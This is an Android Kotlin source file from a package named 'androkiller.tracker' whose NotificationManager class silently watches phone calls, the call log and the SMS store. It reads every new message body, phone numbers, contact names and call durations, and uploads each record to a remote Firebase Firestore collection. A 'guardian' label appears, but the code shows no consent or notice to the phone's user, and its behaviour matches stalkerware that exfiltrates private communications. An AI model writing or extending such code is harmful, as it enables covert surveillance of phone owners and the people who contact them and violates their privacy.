package com.nexus.androkiller.tracker

import android.content.ContentResolver
import android.content.ContentValues
import android.content.Context
import android.database.ContentObserver
import android.net.Uri
import android.os.Handler
import android.os.Looper
import android.provider.CallLog
import android.provider.Telephony
import android.telephony.PhoneStateListener
import android.telephony.TelephonyManager
import android.util.Log
import com.google.firebase.firestore.FieldValue
import com.google.firebase.firestore.FirebaseFirestore
import com.nexus.androkiller.model.NotificationRecord
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import java.util.UUID

class NotificationManager(private val context: Context) {

    private val firestore: FirebaseFirestore?
        get() = try {
            FirebaseFirestore.getInstance()
        } catch (_: Exception) {
            null
        }

    private val scope = CoroutineScope(Dispatchers.IO + Job())
    private var callListener: PhoneStateListener? = null
    private var callLogObserver: ContentObserver? = null
    private var smsObserver: ContentObserver? = null
    private var isListening = false

    private val TAG = "NotificationManager"

    fun startListening(deviceId: String) {
        if (isListening) return
        isListening = true

        startCallListener(deviceId)
        startCallLogObserver(deviceId)
        startSmsObserver(deviceId)
        Log.i(TAG, "Started real-time notification listeners for device: $deviceId")
    }

    fun stopListening() {
        isListening = false
        callListener?.let {
            try {
                val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
                tm.listen(it, PhoneStateListener.LISTEN_NONE)
            } catch (e: Exception) {
                Log.w(TAG, "Error stopping call listener: ${e.message}")
            }
        }
        callListener = null

        callLogObserver?.let {
            try {
                context.contentResolver.unregisterContentObserver(it)
            } catch (e: Exception) {
                Log.w(TAG, "Error stopping call log observer: ${e.message}")
            }
        }
        callLogObserver = null

        smsObserver?.let {
            try {
                context.contentResolver.unregisterContentObserver(it)
            } catch (e: Exception) {
                Log.w(TAG, "Error stopping SMS observer: ${e.message}")
            }
        }
        smsObserver = null

        Log.i(TAG, "Stopped real-time notification listeners")
    }

    private fun startCallListener(deviceId: String) {
        callListener = object : PhoneStateListener() {
            var lastState = TelephonyManager.CALL_STATE_IDLE
            var incomingNumber: String? = null

            override fun onCallStateChanged(state: Int, phoneNumber: String?) {
                super.onCallStateChanged(state, phoneNumber)

                when (state) {
                    TelephonyManager.CALL_STATE_RINGING -> {
                        lastState = state
                        incomingNumber = phoneNumber
                        val name = getContactName(phoneNumber ?: "")
                        scope.launch {
                            pushNotification(
                                deviceId = deviceId,
                                type = "CALL_INCOMING",
                                title = "Incoming Call",
                                body = "Call from $name (${phoneNumber ?: "Unknown"})",
                                contactName = name,
                                contactNumber = phoneNumber ?: "",
                                priority = "MAX"
                            )
                        }
                    }
                    TelephonyManager.CALL_STATE_OFFHOOK -> {
                        if (lastState == TelephonyManager.CALL_STATE_RINGING) {
                            // Call was answered
                            val name = getContactName(incomingNumber ?: "")
                            scope.launch {
                                pushNotification(
                                    deviceId = deviceId,
                                    type = "CALL_OUTGOING",
                                    title = "Call Answered",
                                    body = "Answered call from $name (${incomingNumber ?: "Unknown"})",
                                    contactName = name,
                                    contactNumber = incomingNumber ?: "",
                                    priority = "HIGH"
                                )
                            }
                        } else {
                            // Outgoing call initiated
                            val name = getContactName(phoneNumber ?: "")
                            scope.launch {
                                pushNotification(
                                    deviceId = deviceId,
                                    type = "CALL_OUTGOING",
                                    title = "Outgoing Call",
                                    body = "Calling $name (${phoneNumber ?: "Unknown"})",
                                    contactName = name,
                                    contactNumber = phoneNumber ?: "",
                                    priority = "HIGH"
                                )
                            }
                        }
                        lastState = state
                    }
                    TelephonyManager.CALL_STATE_IDLE -> {
                        if (lastState == TelephonyManager.CALL_STATE_RINGING) {
                            // Missed call
                            val name = getContactName(incomingNumber ?: "")
                            scope.launch {
                                pushNotification(
                                    deviceId = deviceId,
                                    type = "CALL_MISSED",
                                    title = "Missed Call",
                                    body = "Missed call from $name (${incomingNumber ?: "Unknown"})",
                                    contactName = name,
                                    contactNumber = incomingNumber ?: "",
                                    priority = "HIGH"
                                )
                            }
                        }
                        lastState = state
                        incomingNumber = null
                    }
                }
            }
        }

        try {
            val tm = context.getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
            tm.listen(callListener!!, PhoneStateListener.LISTEN_CALL_STATE)
        } catch (e: Exception) {
            Log.e(TAG, "Failed to register call listener: ${e.message}", e)
        }
    }

    private fun startCallLogObserver(deviceId: String) {
        callLogObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean) {
                super.onChange(selfChange)
                scope.launch {
                    checkNewCallLog(deviceId)
                }
            }
        }

        try {
            context.contentResolver.registerContentObserver(
                CallLog.Calls.CONTENT_URI,
                true,
                callLogObserver!!
            )
        } catch (e: Exception) {
            Log.e(TAG, "Failed to register call log observer: ${e.message}", e)
        }
    }

    private var lastCallLogId = 0L

    private suspend fun checkNewCallLog(deviceId: String) {
        try {
            val projection = arrayOf(
                CallLog.Calls._ID,
                CallLog.Calls.NUMBER,
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION
            )

            val cursor = context.contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                projection,
                "${CallLog.Calls._ID} > ?",
                arrayOf(lastCallLogId.toString()),
                "${CallLog.Calls.DATE} DESC"
            )

            cursor?.use {
                if (it.moveToFirst()) {
                    val idCol = it.getColumnIndex(CallLog.Calls._ID)
                    val numCol = it.getColumnIndex(CallLog.Calls.NUMBER)
                    val nameCol = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
                    val typeCol = it.getColumnIndex(CallLog.Calls.TYPE)
                    val dateCol = it.getColumnIndex(CallLog.Calls.DATE)
                    val durCol = it.getColumnIndex(CallLog.Calls.DURATION)

                    do {
                        val id = if (idCol != -1) it.getLong(idCol) else 0L
                        val number = if (numCol != -1) it.getString(numCol) ?: "Unknown" else "Unknown"
                        val name = if (nameCol != -1) it.getString(nameCol) ?: "" else ""
                        val rawType = if (typeCol != -1) it.getInt(typeCol) else -1
                        val date = if (dateCol != -1) it.getLong(dateCol) else 0L
                        val duration = if (durCol != -1) it.getLong(durCol) else 0L

                        if (id > lastCallLogId) {
                            lastCallLogId = id
                        }

                        val typeStr = when (rawType) {
                            CallLog.Calls.INCOMING_TYPE -> "CALL_INCOMING"
                            CallLog.Calls.OUTGOING_TYPE -> "CALL_OUTGOING"
                            CallLog.Calls.MISSED_TYPE -> "CALL_MISSED"
                            CallLog.Calls.REJECTED_TYPE -> "CALL_MISSED"
                            else -> "CALL_INCOMING"
                        }

                        val contactName = name.ifBlank { number }
                        val title = when (typeStr) {
                            "CALL_INCOMING" -> "Incoming Call"
                            "CALL_OUTGOING" -> "Outgoing Call"
                            "CALL_MISSED" -> "Missed Call"
                            else -> "Call"
                        }
                        val priority = when (typeStr) {
                            "CALL_MISSED" -> "HIGH"
                            "CALL_INCOMING" -> "MAX"
                            else -> "HIGH"
                        }
                        val durFormatted = if (duration < 60) "${duration}s" else "${duration / 60}m ${duration % 60}s"
                        val body = when (typeStr) {
                            "CALL_INCOMING" -> "Call from $contactName ($number)"
                            "CALL_OUTGOING" -> "Called $contactName ($number) - $durFormatted"
                            "CALL_MISSED" -> "Missed call from $contactName ($number)"
                            else -> "Call from $contactName ($number)"
                        }

                        pushNotification(
                            deviceId = deviceId,
                            type = typeStr,
                            title = title,
                            body = body,
                            contactName = contactName,
                            contactNumber = number,
                            priority = priority
                        )
                    } while (it.moveToNext())
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Error checking new call log: ${e.message}")
        }
    }

    private fun startSmsObserver(deviceId: String) {
        smsObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
            override fun onChange(selfChange: Boolean) {
                super.onChange(selfChange)
                scope.launch {
                    checkNewSms(deviceId)
                }
            }
        }

        try {
            context.contentResolver.registerContentObserver(
                Telephony.Sms.CONTENT_URI,
                true,
                smsObserver!!
            )
        } catch (e: Exception) {
            Log.e(TAG, "Failed to register SMS observer: ${e.message}", e)
        }
    }

    private var lastSmsId = 0L

    private suspend fun checkNewSms(deviceId: String) {
        try {
            val projection = arrayOf(
                Telephony.Sms._ID,
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.TYPE,
                Telephony.Sms.DATE
            )

            val cursor = context.contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                projection,
                "${Telephony.Sms._ID} > ?",
                arrayOf(lastSmsId.toString()),
                "${Telephony.Sms.DATE} DESC"
            )

            cursor?.use {
                if (it.moveToFirst()) {
                    val idCol = it.getColumnIndex(Telephony.Sms._ID)
                    val addrCol = it.getColumnIndex(Telephony.Sms.ADDRESS)
                    val bodyCol = it.getColumnIndex(Telephony.Sms.BODY)
                    val typeCol = it.getColumnIndex(Telephony.Sms.TYPE)
                    val dateCol = it.getColumnIndex(Telephony.Sms.DATE)

                    do {
                        val id = if (idCol != -1) it.getLong(idCol) else 0L
                        val address = if (addrCol != -1) it.getString(addrCol) ?: "Unknown" else "Unknown"
                        val body = if (bodyCol != -1) it.getString(bodyCol) ?: "" else ""
                        val rawType = if (typeCol != -1) it.getInt(typeCol) else -1
                        val date = if (dateCol != -1) it.getLong(dateCol) else 0L

                        if (id > lastSmsId) {
                            lastSmsId = id
                        }

                        val typeStr = when (rawType) {
                            Telephony.Sms.MESSAGE_TYPE_INBOX -> "SMS_INCOMING"
                            Telephony.Sms.MESSAGE_TYPE_SENT -> "SMS_OUTGOING"
                            else -> "SMS_INCOMING"
                        }

                        val name = getContactName(address)
                        val title = if (typeStr == "SMS_INCOMING") "New SMS" else "SMS Sent"
                        val priority = if (typeStr == "SMS_INCOMING") "HIGH" else "DEFAULT"

                        pushNotification(
                            deviceId = deviceId,
                            type = typeStr,
                            title = title,
                            body = body.take(160),
                            contactName = name,
                            contactNumber = address,
                            priority = priority
                        )
                    } while (it.moveToNext())
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Error checking new SMS: ${e.message}")
        }
    }

    fun pushNotification(
        deviceId: String,
        type: String,
        title: String,
        body: String,
        contactName: String = "",
        contactNumber: String = "",
        priority: String = "DEFAULT"
    ) {
        scope.launch {
            val db = firestore ?: return@launch
            try {
                val notification = NotificationRecord(
                    id = UUID.randomUUID().toString(),
                    deviceId = deviceId,
                    type = type,
                    title = title,
                    body = body,
                    contactName = contactName,
                    contactNumber = contactNumber,
                    isRead = false,
                    priority = priority,
                    timestamp = null
                )

                val payload = hashMapOf(
                    "id" to notification.id,
                    "deviceId" to notification.deviceId,
                    "type" to notification.type,
                    "title" to notification.title,
                    "body" to notification.body,
                    "contactName" to notification.contactName,
                    "contactNumber" to notification.contactNumber,
                    "isRead" to notification.isRead,
                    "priority" to notification.priority,
                    "timestamp" to FieldValue.serverTimestamp()
                )

                db.collection("devices")
                    .document(deviceId)
                    .collection("notifications")
                    .document(notification.id)
                    .set(payload)

                Log.i(TAG, "Pushed notification to Firestore: $type - $title")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to push notification: ${e.message}", e)
            }
        }
    }

    fun pushGuardianMessageNotification(deviceId: String, message: String) {
        pushNotification(
            deviceId = deviceId,
            type = "GUARDIAN_MESSAGE",
            title = "Guardian Alert",
            body = message,
            priority = "MAX"
        )
    }

    fun pushSystemAlert(deviceId: String, title: String, body: String) {
        pushNotification(
            deviceId = deviceId,
            type = "SYSTEM_ALERT",
            title = title,
            body = body,
            priority = "HIGH"
        )
    }

    private fun getContactName(phoneNumber: String): String {
        if (phoneNumber.isBlank()) return "Unknown"
        try {
            val uri = Uri.withAppendedPath(CallLog.Calls.CONTENT_FILTER_URI, Uri.encode(phoneNumber))
            val cursor = context.contentResolver.query(uri, arrayOf(CallLog.Calls.CACHED_NAME), null, null, null)
            cursor?.use {
                if (it.moveToFirst()) {
                    val nameCol = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
                    return if (nameCol != -1) it.getString(nameCol) ?: phoneNumber else phoneNumber
                }
            }
        } catch (_: Exception) {}
        return phoneNumber
    }

    companion object {
        fun initializeSmsCursor(context: Context): Long {
            var lastId = 0L
            try {
                val cursor = context.contentResolver.query(
                    Telephony.Sms.CONTENT_URI,
                    arrayOf(Telephony.Sms._ID),
                    null,
                    null,
                    "${Telephony.Sms.DATE} DESC LIMIT 1"
                )
                cursor?.use {
                    if (it.moveToFirst()) {
                        val idCol = it.getColumnIndex(Telephony.Sms._ID)
                        lastId = if (idCol != -1) it.getLong(idCol) else 0L
                    }
                }
            } catch (_: Exception) {}
            return lastId
        }
    }
}